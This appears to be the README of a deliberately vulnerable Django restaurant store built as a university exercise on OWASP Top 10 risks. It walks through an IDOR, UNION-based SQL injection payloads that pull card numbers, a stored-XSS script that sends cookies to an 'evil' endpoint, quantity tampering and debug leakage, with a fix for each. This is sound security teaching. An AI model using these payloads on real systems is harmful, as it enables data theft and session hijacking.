# Welcome to django food store!

This is a university project designed to explore and understand the most critical security risks in web applications.

django food store is a restaurant e-commerce demo that provides a safe environment to learn about web security vulnerabilities and how to mitigate them using the Django framework. By understanding the underlying logic demonstrated here, you will be able to apply the same security principles to any other framework of your choice.

This project is based on the [OWASP Top 10 (2021)](https://owasp.org/Top10/2021/) and focuses on demonstrating **5 of the 10 critical risks** listed below.

> ⚠️ **Warning:** This project is intentionally vulnerable. Do **not** deploy it in a production environment or expose it to the public internet.

---

## Prerequisites

To run django food store, you will need to have installed:

- Python (latest version recommended)
- Pip
- Postman
### Create the virtual environment

```bash
python -m venv .venv
```

Activate the virtual environment:

- On Windows:
```bash
.venv\Scripts\activate
```

- On macOS/Linux:
```bash
source .venv/bin/activate
```

### Install dependencies

Once the virtual environment is active, install all dependencies listed in `requirements.txt`:

```bash
pip install -r requirements.txt
```

### Configure the database

Run the following commands sequentially to set up and populate the database with default data:

```bash
python manage.py makemigrations
python manage.py migrate
python manage.py loaddata default_products.json
```

### Create a superuser

For practical purposes, create a superuser with the following credentials:

```bash
python manage.py createsuperuser
```

Recommended credentials (for local development only):

- **Username:** admin
- **Email:** admin@admin.com
- **Password:** admin123
> ⚠️ These credentials are **only for local development**. Never use them in any other environment.

---

## Run the server

Since this application uses `django-tailwind-cli` to handle Tailwind CSS styling, the app needs to compile the necessary configurations before serving templates. Start the server with:

```bash
python manage.py tailwind runserver
```

---

## OWASP Top 10:2021

| # | Flaw | Location | Fix |
|---|---|---|---|
| A01 | Broken Access Control (IDOR) | [Receipt view](/products/views.py#L143) | [Fix Receipt view](/products/views.py#L148) |
| A02 | Cryptographic Failures | [User creation](/users/views.py#L133) | [Fix User creation](/users/views.py#L140) |
| A03 | SQL Injection | [Search bar](/products/views.py#L14) | [Fix Search bar](/products/views.py#L20) |
| A03 | Stored XSS | [Hijacking](/products/views.py#L125) | [Hijacking](/products/views.py#L131) |
| A04 | Insecure Design | [Unauthorized discount](products/views.py#L30) | [Fix Unauthorized discount](/products/views.py#L58) |
| A05 | Security Misconfiguration | [Settings](/django_store/settings.py#L40) | [Fix settings](/django_store/settings.py#L45) |

### A01 — Broken Access Control

**Where to find it:** `...`

**What it does:**
The first vulnerability we have is A01:2021 – Broken Access Control. This vulnerability is based on a user with limited privileges accessing information that, in theory, should not be available to them due to their role limitations. 

In the django food store project, I demonstrate this vulnerability using references to an unsafe direct object. The lifecycle for simulating this vulnerability is as follows: Two accounts must be created in the registration section (we willl call these accounts "A" and "B"). With account A, add a product to the cart and proceed to the shopping cart (you will notice you didn't have to register your card, as the app generates a random one for practical purposes). Purchase the product and, as a satisfied user, end your session while awaiting delivery (click on "profile" and then "log out"). Now log in with account B and repeat the process but stop at the product receipt screen. User B is a more malicious and curious user, interested in what is happening in the web application, so they decide to test what happens if they change the receipt number in the URL to a "1". And surprise! User A’s receipt is exposed to any curious user who happens to find their receipt number.

**How to mitigate it:**
This flaw was caused by a lack of user validation. We can see that in "order = get_object_or_404(Order, id=order_id)", even though we successfully obtain the exact order requested by the web application, it does not validate that the order belongs to the user who made the purchase. This can be easily resolved by adding the user object reference and the user making the request. This ensures data confidentiality, since if the order number is not related to the requesting user, it will return a 404 response. This same logic should be applied to any request. It is always necessary to verify WHO or WHAT is requesting the data.

---

### A02 — Cryptographic Failures

**Where to find it:** `...`

**What it does:**
We move on to A02:2021 – Cryptographic Failures. While demonstrated via an SQL Injection (SQLi), the focus here is the exposure of sensitive data transmitted or stored without adequate encryption. 

In our application, the product search bar queries the database. As penetration testers, we can exploit this to extract credit cards. I encourage you to formulate the payload to obtain this information before reading the solution. 

- ' OR '1'='1 => Confirms the vulnerability. 

- ' ORDER BY N-- => Increment N until the application crashes to determine the column count needed for a UNION query. 

- UNION SELECT name, type, 0, sql, null, null FROM sqlite_master WHERE type='table' -- => Lists all tables. 

- UNION SELECT type, name, 0, sql, null, null FROM sqlite_master WHERE type='table' -- => Lists table columns. 

- UNION SELECT 0, card_number_secure, 0, 0, 0, 0 FROM users_creditcard -- => Extracts the plain-text card number. (Replace the column name to extract other data).

**How to mitigate it:**
We solve this problem as follows. To prevent SQL Injection, we need to start the search bar in the backend. The command ‘products = Product.objects.filter(name__icontains=query).order_by("-created_at")’ uses Django's ORM, which employs parameterized queries, separating the SQL from the data. The user's input value is never directly concatenated to the query, instead, it is passed as a parameter to the database driver, which always treats it as data and never as an SQL statement. This ensures that any injection attempt is interpreted as plain text. For card encryption, we use the command ‘card_data_to_save = make_password(raw_number)’. It is rather ironic to apply a robust PBKDF2-SHA256 hash to a card number using “make_password” while the system operates over http://localhost without TLS encryption. This implementation serves only as a conceptual demonstration of the importance of not storing data in plain text. In a real production environment, this level of backend hashing is unnecessary, as the industry standard dictates that the interface sends the information directly to payment gateways, which handle tokenization, ensuring that the original number never passes through or needs to be processed by our server.

---

### A03 — Injection

**Where to find it:** `...`

**What it does:**
We will now discuss A03:2021 – Injection. This vulnerability is based on the entry of unsanitized malicious code into the application, allowing the execution of commands that compromise the confidentiality and integrity of the data. In this case, I will demonstrate that User-supplied data is not validated, filtered, or sanitized by the application. 

As you may have noticed when purchasing a product in the application, there is a small text box that allows us to specify delivery instructions. Returning to our role as pentesters, we decide to introduce a small script to attempt a hijacking attack. We place the following script in the box: 

```bash
<script> 
new Image().src = "http://localhost:8000/evil?c=" + encodeURIComponent(document.cookie); 
</script> Kiittis!
```

This script is very interesting, since the resource that Image loads is a static resource load. The browser never applies CORS to embedded resources such as images, scripts, or iframes. The request goes out without restrictions, and the cookies are automatically attached. 

Now we will proceed to log out and log in as administrator. Upon reviewing the order, we do not observe anything unusual. Now, please open the application terminal. You will see that your session cookie has been stolen and successfully sent to a malicious server (in this case, we are simulating that "evil/" was the malicious server that received the cookie).

**How to mitigate it:**
This is resolved by limiting the interaction of cookies with JavaScript. This allows the cookie to only be read internally by the browser to be automatically attached to each HTTP request, but no script can access it. Furthermore, we need to sanitize the information sent by the user. We do this with the "escape" method (cart.shipping_instructions = escape(request.POST.get('shipping_instructions', ''))), which converts special HTML characters into entities, allowing us to render visible text on the screen without interpreting it as executable code.

---

### A04 — Insecure Design

**Where to find it:** `...`  
**What it does:**
We will now discuss A04:2021 – Insecure Design. Based on its definition, this refers to an insecure system that, from its inception, did not plan any type of defense to protect the application from threat agents; architecturally, security was never considered regarding the application's functionality. The flaw I will demonstrate involves the shopping cart. The design never considered anything outside the standard cycle of adding a product, removing it, and buying it. Now, let's try adding 3 “tlayudas con tasajo” to the cart because we are very hungry. Building on this, we will attempt to get a "discount" authorized by ourselves. If we analyze the network traffic when adding a product to the cart, we can spot our target parameter and endpoint. Knowing that "quantity" represents the amount the server expects, we will modify it before sending the data. Since the HTML input doesn't allow this, we will use an HTTP Client like "Postman", although you can use any client of your choice. 

Use the following endpoint: http://127.0.0.1:8000/products/1/add-to-cart/ Inside the body, under form-data, add the key quantity and set its value to -2. 

Refresh the page, and you will notice that your discount has been successfully authorized (thanks to the developer).

**How to mitigate it:**
To fix this, we need to define exactly what data our system requires to function correctly. We only need positive numbers, a product limit, a minimum quantity, a maximum quantity per request, and a maximum total quantity. By establishing this, we can uncomment the code in our function and repeat the lifecycle. You will notice that you can no longer obtain a self-authorized discount.

---

### A05 — Security Misconfiguration

**Where to find it:** `...`  

**What it does:**
To conclude, we will address the A05:2021 – Security Misconfiguration vulnerability. This security breach stems from the absence of appropriate security configurations or the retention of unnecessary diagnostic features within the application's environment. Although its exploitation is straightforward, its impact is critical, as it exposes sensitive information regarding the system's internal architecture. 

To demonstrate this vulnerability, we present a scenario where a user attempts to access an unregistered route, such as http://localhost:8000/rickroll. In response, the system returns a 404 error but detrimentally exposes all valid URLs for the project. This leakage allows an attacker to map the application, identifying available endpoints, route structures, and expected parameters. To escalate the impact, we can force an HTTP 500 error on the server by replicating the shopping cart attack, but this time injecting a text string instead of a numerical value into the quantity parameter. The result is an error screen that divulges critical technical data, such as the exact Django version, the Python version, and the absolute file paths of the server directories. 

**How to mitigate it:**
The remediation for this issue lies strictly following the production deployment guidelines of the framework in use. In the case of Django, it is imperative to set the DEBUG = False directive within the settings.py file. This measure disables the debugging mode, hiding error traces and preventing information leakage, which, while indispensable during the development cycle, poses an unacceptable risk in production. 

---

## License

This project is licensed under the [MIT License](LICENSE).